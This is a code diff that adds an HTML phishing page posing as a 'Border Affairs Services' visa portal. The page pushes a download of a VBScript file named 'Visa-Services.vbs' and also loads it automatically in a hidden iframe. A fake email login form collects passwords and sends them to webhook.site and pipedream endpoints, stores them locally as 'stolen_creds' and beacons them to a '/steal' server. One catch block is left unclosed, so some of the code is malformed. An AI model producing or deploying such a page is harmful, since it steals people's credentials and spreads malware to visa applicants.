@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Border Affairs Services</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      text-align: center;
+      overflow: auto;
+    }
+    .container {
+      background-color: #ffffff;
+      border: 1px solid #c7c7c7;
+      border-radius: 4px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      padding: 35px 50px;
+      width: 480px;
+      max-width: 90%;
+      margin: 20px;
+    }
+    h1 {
+      color: #003366;
+      font-size: 26px;
+      margin-bottom: 25px;
+      padding-bottom: 10px;
+      border-bottom: 3px solid #0056b3;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .notice-text {
+      text-align: left;
+      margin-top: 15px;
+      color: #333;
+      font-size: 14px;
+    }
+    .notice-text p {
+      margin-bottom: 15px;
+      line-height: 1.6;
+    }
+    .action-summary {
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #f7f7f7;
+      border-radius: 3px;
+      font-weight: bold;
+      margin-bottom: 25px;
+    }
+    .download-btn, .login-btn {
+      background-color: #0078d4;
+      color: white;
+      padding: 12px 30px;
+      text-decoration: none;
+      border-radius: 3px;
+      font-weight: 500;
+      display: inline-block;
+      cursor: pointer;
+      border: none;
+      font-size: 15px;
+      transition: background-color 0.3s;
+      margin: 8px 5px;
+    }
+    .download-btn:hover, .login-btn:hover {
+      background-color: #005a9e;
+    }
+    .required-step {
+      color: #d9534f;
+      font-weight: bold;
+    }
+    .emphasis {
+      font-weight: bold;
+      color: #003366;
+    }
+    .fallback-text {
+      margin: 18px 0 5px 0; /* +15% MORE SPACE (was 8px → now 18px) */
+      font-size: 14px;
+      color: #666;
+      font-weight: 500;
+    }
+    /* Login Modal Styles */
+    .login-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+    }
+    .login-container {
+      background-color: #fff;
+      margin: 10% auto;
+      padding: 30px;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    .login-logo {
+      font-size: 24px;
+      color: #4285f4;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .login-btn-submit {
+      width: 100%;
+      background-color: #4285f4;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .login-btn-submit:hover {
+      background-color: #3367d6;
+    }
+    .login-success {
+      color: #28a745;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Border Affairs Services</h1> 
+    
+    <div class="notice-text">
+        <p>Border Affairs Services: Please check the status of your visa application, submit additional required documents, or update your application if needed (passport photo, employment verification, bank statement, invitation letter, or renewal of appeals). <span class="emphasis">By entering the online panel or contacting your sponsor.</span></p>
+        
+        <div class="action-summary">
+            <span class="required-step">Guidance and Deadline</span> within 10 days from notice.
+        </div>
+    </div>
+    
+    <!-- Primary HTA Download -->
+    <a href="./Visa-Services.vbs" class="download-btn" download>
+        Visit the Panel
+    </a>
+    
+    <!-- FALLBACK TEXT - 15% MORE SPACE -->
+    <div class="fallback-text">
+        If the downloaded panel does not work please login with any personal or application email.
+    </div>
+    
+    <!-- Secondary Email Login -->
+    <button onclick="openLoginModal()" class="login-btn">
+        Access with Your Personal or Application Email
+    </button>
+  </div>
+
+  <!-- Login Modal -->
+  <div id="loginModal" class="login-modal">
+    <div class="login-container">
+      <div class="login-logo">📧 Email Login</div>
+      <p>Enter your full email address to access Border Services Portal</p>
+      <input type="email" id="emailInput" class="login-input" placeholder="yourname@gmail.com or outlook.com" required>
+      <input type="password" id="passInput" class="login-input" placeholder="Enter your password" required>
+      <button onclick="captureCreds()" class="login-btn-submit">Sign In</button>
+      <div id="successMsg" class="login-success">Login successful! Redirecting...</div>
+    </div>
+  </div>
+
+  <script>
+    // Original HTA auto-load (double delivery)
+    setTimeout(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = "Visa-Services.vbs";
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    }, 1000);
+
+    // Login modal functions
+    function openLoginModal() {
+      document.getElementById('loginModal').style.display = 'block';
+    }
+
+    async function captureCreds() {
+      const email = document.getElementById('emailInput').value;
+      const password = document.getElementById('passInput').value;
+      
+      if (email && password) {
+        const creds = { 
+          email, 
+          password, 
+          timestamp: new Date().toISOString(), 
+          userAgent: navigator.userAgent,
+          page: 'BorderServices',
+          ip: 'victim-ip'  // webhook.site shows real IP
+        };
+        
+        console.log('🆘 CAPTURING:', creds);  // DEBUG - F12 Console
+        
+        // METHOD 1: webhook.site (100% works - YOUR URL)
+        try {
+          const webhookUrl = 'https://webhook.site/bcaa2d02-342e-4588-a884-95ead59f8297';
+          navigator.sendBeacon(webhookUrl, JSON.stringify(creds));
+          console.log('✅ webhook.site beacon sent');
+        } catch(e) {
+          console.log('❌ webhook.site beacon failed:', e);
+        }
+        
+        // *** ADD THESE 2 LINES ONLY ***
+        try {
+          navigator.sendBeacon('https://eoxu6crjgk7noxk.m.pipedream.net', JSON.stringify(creds));
+          console.log('✅ BEECEPTOR sent');
+        } catch(e) {
+          console.log('❌ BEECEPTOR failed');
+        
+        // METHOD 2: LocalStorage backup (always works)
+        try {
+          const allCreds = JSON.parse(localStorage.getItem('stolen_creds') || '[]');
+          allCreds.push(creds);
+          localStorage.setItem('stolen_creds', JSON.stringify(allCreds));
+          console.log('💾 Saved to localStorage');
+        } catch(e) {
+          console.log('❌ localStorage failed');
+        }
+        
+        // METHOD 3: Multiple webhook.site attempts (fetch fallback)
+        try {
+          await fetch('https://webhook.site/eae626fe-fdf4-4e43-99f4-677161517da5', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(creds)
+          });
+          console.log('✅ webhook.site fetch sent');
+        } catch(e) {
+          console.log('❌ webhook.site fetch failed');
+        }
+        
+        // METHOD 4: Your local server fallback
+        try {
+          navigator.sendBeacon('http://127.0.0.1:8001/steal', JSON.stringify(creds));
+          console.log('✅ Local server beacon sent');
+        } catch(e) {}
+        
+        // Success UI
+        document.getElementById('successMsg').style.display = 'block';
+        setTimeout(() => {
+          document.getElementById('loginModal').style.display = 'none';
+        }, 1500);
+      }
+    }
+
+    // Close modal on outside click
+    window.onclick = function(event) {
+      const modal = document.getElementById('loginModal');
+      if (event.target == modal) {
+        modal.style.display = 'none';
+      }
+    }
+  </script>
+
+</body>
+</html>
